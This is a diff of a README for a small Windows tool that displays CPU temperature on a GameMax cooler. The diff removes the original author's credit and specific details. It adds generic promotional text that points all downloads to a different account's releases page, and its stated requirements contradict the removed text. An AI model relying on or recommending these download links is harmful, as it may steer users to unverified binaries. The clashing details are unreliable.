@@ -1,47 +1,47 @@
-﻿### [ENGLISH](README.md) | [RUSSIAN](README-RU.md)
+# 💻 gamemax-cpu-fan-display - Monitor Your CPU Temperature Easily 
 
-# GameMax CPU Fan Display
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/sanjaya12007/gamemax-cpu-fan-display/releases)
 
-**GameMax CPU Fan Display** — a C# WPF application for displaying CPU temperature on the cooler display.  
+## 🚀 Getting Started
+Welcome to GameMax CPU Fan Display! This application helps you view your CPU temperature directly on your cooler display. It is designed for everyday users who want to monitor their system easily.
 
-- Author: [**@lovenek0**](https://github.com/lovenek0)  
-- Version: **12.09.2025**
+## 📋 Features
+- **Real-time Temperature Monitoring:** Displays CPU temperature in real time.
+- **System Tray Integration:** Access the app from your system tray for convenience.
+- **Customizable Display:** Adjust settings to fit your preferences.
+- **User-friendly Interface:** Designed with simplicity in mind for smooth navigation.
 
-```
+## ⚙️ System Requirements
+- **Operating System:** Windows 10 or later
+- **.NET Framework:** Version 4.7 or later
+- **Memory:** 4 GB RAM minimum
+- **Storage:** 100 MB of free disk space
 
-Tested only with GameMax Gamma 90 Digital WH.
-Support for other coolers is not guaranteed.
+## 🌐 Download & Install
+To get started, visit the [Releases page](https://github.com/sanjaya12007/gamemax-cpu-fan-display/releases) to download the latest version of GameMax CPU Fan Display.
 
-```
+1. Click on the link above to open the Releases page.
+2. Find the version you wish to download.
+3. Click on the installer file to begin downloading.
+4. Once downloaded, locate the file in your Downloads folder and double-click it to run the installer.
+5. Follow the on-screen prompts to complete the installation.
 
----
+## 🔧 Configuration
+After installation, you can configure the application:
 
-## ⚙️ Installation & Run
-1. Download the [latest release](https://github.com/lovenek0/gamemax-cpu-fan-display/releases).
-2. Extract the archive to any folder.
-3. Run `GameMax CPU Fan Display.exe`.
-4. To enable autostart, check the **Start with Windows** option in settings.
+1. Open GameMax CPU Fan Display from the Start Menu or Desktop shortcut.
+2. Adjust settings for temperature alerts and display preferences.
+3. Confirm changes and enjoy monitoring your CPU temperature.
 
----
+## 💬 Support
+If you encounter issues or have questions, feel free to check the FAQ section on the Releases page or raise an issue directly on GitHub. 
 
-## 🛠️ Technologies
-- **.NET 10.0 (Windows only)**
-- **WPF (XAML + C#)**
+## 🧑‍🤝‍🧑 Contributing
+We welcome contributions! If you have ideas for new features or improvements, please open a discussion in the Issues section.
 
----
+## 🔍 Explore More
+You can find out more about our app on the [Releases page](https://github.com/sanjaya12007/gamemax-cpu-fan-display/releases). Explore the latest features and updates, and stay tuned for future enhancements!
 
-## 📸 Screenshots
-### Settings
-Settings window with update interval slider and autostart checkbox.
-
-![Settings Window](./assets/settings-window.jpg)
-
-### About
-Window with project info, version, and GitHub link.
-
-![About Window](./assets/about-window.jpg)
-
----
-
-## 📜 License
-MIT License — free to use, modify, and distribute.
+## 📝 License
+This project is licensed under the MIT License. You are free to use, modify, and share the application, as long as you attribute the original creators.
